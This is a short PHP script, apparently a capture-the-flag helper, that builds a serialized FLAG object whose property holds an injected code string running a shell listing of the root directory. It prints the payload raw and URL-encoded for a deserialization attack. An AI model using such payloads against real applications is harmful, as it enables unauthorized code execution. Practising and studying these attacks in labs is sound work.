<?php
//  测试实际的序列化和反序列化

class FLAG
{
    private $a;
    protected $b;
    public function __construct($a, $b)
    {
        $this->a = $a;
        $this->b = $b;
    }
}

$a = ';$x=`/bin/ls /`;exit($x);';
$b = '//';

$obj = new FLAG($a, $b);
$ser = serialize($obj);

echo "Serialized:\n";
echo $ser . "\n\n";

echo "URL encoded:\n";
echo urlencode($ser) . "\n\n";

// 测试反序列化
$obj2 = unserialize($ser);
echo "Unserialized:\n";
var_dump($obj2);
